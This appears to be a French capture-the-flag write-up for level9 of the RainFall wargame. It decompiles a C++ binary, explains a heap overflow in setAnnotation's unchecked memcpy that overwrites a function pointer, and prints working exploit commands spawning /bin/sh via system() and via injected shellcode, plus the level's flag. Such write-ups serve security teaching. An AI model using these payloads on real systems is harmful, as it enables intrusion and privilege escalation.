Read also: [./Resources/README.md](./Resources/README.md)

# Source

https://dogbolt.org/?id=563ef243-714b-4c51-a5a5-ecc13358fab5

```c
int32_t main(int32_t argc, char** argv, char** envp)
{
  if (argc > 1)
  {
      int32_t* eax = operator new(108);
      N::N(eax, 5);
      int32_t* eax_1 = operator new(108);
      N::N(eax_1, 6);
      N::setAnnotation(eax, argv[1]);
      return **eax_1(eax_1, eax);
  }
  _exit(1);
  /* no return */
}

int32_t N::setAnnotation(int32_t arg1, char* arg2)
{
  return memcpy((arg1 + 4), arg2, strlen(arg2));
}

int32_t* N::N(int32_t* arg1, int32_t arg2)
{
  *arg1 = 0x8048848;
  arg1[26] = arg2;
  return arg1;
}
```

# Explication

**objdump -d level9 :**

```
080484f0 <_exit@plt>:
 80484f0:     ff 25 60 9b 04 08     jmp *0x8049b60
 80484f6:     68 20 00 00 00        push   $0x20
 80484fb:     e9 a0 ff ff ff        jmp 80484a0 <_init+0x3c>

[...]

08048510 <memcpy@plt>:
 8048510:     ff 25 68 9b 04 08     jmp *0x8049b68
 8048516:     68 30 00 00 00        push   $0x30
 804851b:     e9 80 ff ff ff        jmp 80484a0 <_init+0x3c>

08048520 <strlen@plt>:
 8048520:     ff 25 6c 9b 04 08     jmp *0x8049b6c
 8048526:     68 38 00 00 00        push   $0x38
 804852b:     e9 70 ff ff ff        jmp 80484a0 <_init+0x3c>

08048530 <_Znwj@plt>: => new
 8048530:     ff 25 70 9b 04 08     jmp *0x8049b70
 8048536:     68 40 00 00 00        push   $0x40
 804853b:     e9 60 ff ff ff        jmp 80484a0 <_init+0x3c>

[...]

080485f4 <main>:
 80485f4:     55                    push   %ebp
 80485f5:     89 e5                 mov %esp,%ebp
 80485f7:     53                    push   %ebx
 80485f8:     83 e4 f0              and $0xfffffff0,%esp
 80485fb:     83 ec 20              sub $0x20,%esp
 80485fe:     83 7d 08 01           cmpl   $0x1,0x8(%ebp)
 8048602:     7f 0c                 jg  8048610 <main+0x1c>
 8048604:     c7 04 24 01 00 00 00  movl   $0x1,(%esp)
 804860b:     e8 e0 fe ff ff        call   80484f0 <_exit@plt>
    ^^ cette partie la vérifie si argc > 1 sinon elle exit ^^
 8048610:     c7 04 24 6c 00 00 00  movl   $0x6c,(%esp)
 8048617:     e8 14 ff ff ff        call   8048530 <_Znwj@plt> ⇐ call new
 804861c:     89 c3                 mov %eax,%ebx
 804861e:     c7 44 24 04 05 00 00  movl   $0x5,0x4(%esp)
 8048625:     00
 8048626:     89 1c 24              mov %ebx,(%esp)
 8048629:     e8 c8 00 00 00        call   80486f6 <_ZN1NC1Ei>  ⇐ call constructor
 804862e:     89 5c 24 1c           mov %ebx,0x1c(%esp)
 8048632:     c7 04 24 6c 00 00 00  movl   $0x6c,(%esp)
 8048639:     e8 f2 fe ff ff        call   8048530 <_Znwj@plt> ⇐ call new
 804863e:     89 c3                 mov %eax,%ebx
 8048640:     c7 44 24 04 06 00 00  movl   $0x6,0x4(%esp)
 8048647:     00
 8048648:     89 1c 24              mov %ebx,(%esp)
 804864b:     e8 a6 00 00 00        call   80486f6 <_ZN1NC1Ei>  ⇐ call constructor
 8048650:     89 5c 24 18           mov %ebx,0x18(%esp)

 8048654:     8b 44 24 1c           mov 0x1c(%esp),%eax
 8048658:     89 44 24 14           mov %eax,0x14(%esp)
 804865c:     8b 44 24 18           mov 0x18(%esp),%eax
 8048660:     89 44 24 10           mov %eax,0x10(%esp)
 8048664:     8b 45 0c              mov 0xc(%ebp),%eax
 8048667:     83 c0 04              add $0x4,%eax
 804866a:     8b 00                 mov (%eax),%eax
 804866c:     89 44 24 04           mov %eax,0x4(%esp)
 8048670:     8b 44 24 14           mov 0x14(%esp),%eax
 8048674:     89 04 24              mov %eax,(%esp)
 8048677:     e8 92 00 00 00        call   804870e <_ZN1N13setAnnotationEPc>  ⇐ call setAnnotation
 804867c:     8b 44 24 10           mov 0x10(%esp),%eax
 8048680:     8b 00                 mov (%eax),%eax
 8048682:     8b 10                 mov (%eax),%edx
 8048684:     8b 44 24 14           mov 0x14(%esp),%eax
 8048688:     89 44 24 04           mov %eax,0x4(%esp)
 804868c:     8b 44 24 10           mov 0x10(%esp),%eax
 8048690:     89 04 24              mov %eax,(%esp)
 8048693:     ff d2                 call   *%edx
 8048695:     8b 5d fc              mov -0x4(%ebp),%ebx
 8048698:     c9                    leave
 8048699:     c3                    ret

[...]

080486f6 <_ZN1NC1Ei>:
 80486f6:     55                    push   %ebp
 80486f7:     89 e5                 mov %esp,%ebp
 80486f9:     8b 45 08              mov 0x8(%ebp),%eax
 80486fc:     c7 00 48 88 04 08     movl   $0x8048848,(%eax)
 8048702:     8b 45 08              mov 0x8(%ebp),%eax
 8048705:     8b 55 0c              mov 0xc(%ebp),%edx
 8048708:     89 50 68              mov %edx,0x68(%eax)
 804870b:     5d                    pop %ebp
 804870c:     c3                    ret
 804870d:     90                    nop

0804870e <_ZN1N13setAnnotationEPc>:
 804870e:     55                    push   %ebp
 804870f:     89 e5                 mov %esp,%ebp
 8048711:     83 ec 18              sub $0x18,%esp
 8048714:     8b 45 0c              mov 0xc(%ebp),%eax
 8048717:     89 04 24              mov %eax,(%esp)
 804871a:     e8 01 fe ff ff        call   8048520 <strlen@plt>
 804871f:     8b 55 08              mov 0x8(%ebp),%edx
 8048722:     83 c2 04              add $0x4,%edx
 8048725:     89 44 24 08           mov %eax,0x8(%esp)
 8048729:     8b 45 0c              mov 0xc(%ebp),%eax
 804872c:     89 44 24 04           mov %eax,0x4(%esp)
 8048730:     89 14 24              mov %edx,(%esp)
 8048733:     e8 d8 fd ff ff        call   8048510 <memcpy@plt>
 8048738:     c9                    leave
 8048739:     c3                    ret
 ```
## Méthode spécifique au binary

**Adresse de la fonction system :**

```
(gdb) p system
$1 = {<text variable, no debug info>} 0xb7d86060 <system>
```

Donc : `0xb7d86060` => `\x60\x60\xd8\xb7`

Avec `b *0x08048698` (= fin de main), on peut regarder la mémoire de la variable utilisé pour memcpy :

```
(gdb) x/40xb 0x804a000

0x804a000:    0x00  0x00  0x00  0x00  0x71  0x00  0x00  0x00
       vv       08    09    0a    0b    0c
0x804a008:    0x48  0x88  0x04  0x08  0x41  0x41  0x41  0x41
0x804a010:    0x41  0x41  0x41  0x41  0x41  0x41  0x41  0x41
0x804a018:    0x41  0x41  0x41  0x41  0x41  0x41  0x41  0x41
0x804a020:    0x41  0x41  0x41  0x41  0x41  0x41  0x41  0x41
[...]
0x804a050:    0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
0x804a058:    0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
0x804a060:    0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
0x804a068:    0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
       vv       71    72    73    74
0x804a070:    0x05  0x00  0x00  0x00  0x71  0x00  0x00  0x00
                                        60    60    d8    b7
0x804a078:    0x48  0x88  0x04  0x08  0x00  0x00  0x00  0x00
                74    a0    04    08    3b    2f    62     …
0x804a080:    0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
```

(Noter mes annotations entre les lignes pour s'imaginer comment on veut agencer la mémoire).

On calcule la distance entre le début du stockage et le pointeur sur fonction : 74 - 0c = 104

On obtient donc :
```
level9@RainFall:~$ ./level9 $(python -c "print('a' * 104 + '\x60\x60\xd8\xb7' + '\x74\xa0\x04\x08;/bin/sh')")
sh: 1: t�: not found
$ whoami
bonus0
```

Même méthode mais avec un ordre différent :
```
./level9 $(python -c "print('a' * 108 + '\x7d\xa0\x04\x08' + '_\x60\x60\xd8\xb7;/bin/sh')")
```

On peut vérifier en mettant un pointeur à `b *0x08048698`.

Explication pour : `./level9 $(python -c "print('a' * 104 + '\x60\x60\xd8\xb7' + '\x74\xa0\x04\x08;/bin/sh')")`

On souhaite que les 4 bytes de la deuxième adresse qui pointe vers les valeurs en mémoire soit écrit dans la position du
pointeur sur fonction utilisé dans le code. Donc on veut écrire à partir du 108ème caractère (à noter que l’overflow
commence à 104). Si on commence à 104 on peut écrire l’adresse de la fonction system (1er adresse \xb3\xfd…) sur les
bytes 104 à 107 inclus.

```
0x804a070:    0x05  0x00  0x00  0x00  0x71  0x00  0x00  0x00
                                        60    60    d8    b7
0x804a078:    0x48  0x88  0x04  0x08  0x00  0x00  0x00  0x00
                74    a0    04    08    3b    2f    62     …
0x804a080:    0x00  0x00  0x00  0x00  0x00  0x00  0x00  0x00
```

Une fois qu’on a préparé l’argument comme suit, memcpy (non protégé) va appliquer notre injection de bytes dans la mémoire,
le pointeur de fonction va s'exécuter lançant la fonction system grâce à notre agencement et prendre la suite en argument ce
qui explique l’erreur d’argument “sh: 1: }�_ط: not found” avant le readline de shell.

Ressources :

 - https://www.youtube.com/watch?v=qpyRz5lkRjE
 - https://www.youtube.com/watch?v=1S0aBV-Waeo 

## Méthode avec shellcode : 

Ceci est un exemple via injection de shellcode, on peut qualifier cette méthode d'"universel". On utilise ce shellcode : https://www.exploit-db.com/exploits/13357

```
export ICE=$(python -c 'print "\x90" * 1000 + "\x31\xc0\x31\xdb\xb0\x06\xcd\x80\x53\x68/tty\x68/dev\x89\xe3\x31\xc9\x66\xb9\x12\x27\xb0\x05\xcd\x80\x31\xc0\x50\x68//sh\x68/bin\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80";')
```

```
(gdb) x/10s *((char **)environ)
0xbffff4f1:  	"SHELL=/bin/bash"
[...]
0xbffffb7d:  	"LESSOPEN=| /usr/bin/lesspipe %s"
0xbffffb9d:  	"LESSCLOSE=/usr/bin/lesspipe %s %s"
0xbffffbbf:  	"ICE=\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...
[...]
0xbffffd4f:  	"\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220"...

0xbffffbbf + 500 = 0xbffffdb3
```

Donc `0xbffffdb3` => `\xb3\xfd\xff\xbf`

On a cette commande :

```
level9@RainFall:~$ ./level9 $(python -c "print('a' * 104 + '\xb3\xfd\xff\xbf' + '\x74\xa0\x04\x08')")
```

On obtient donc le flag suivant !

```
f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
```
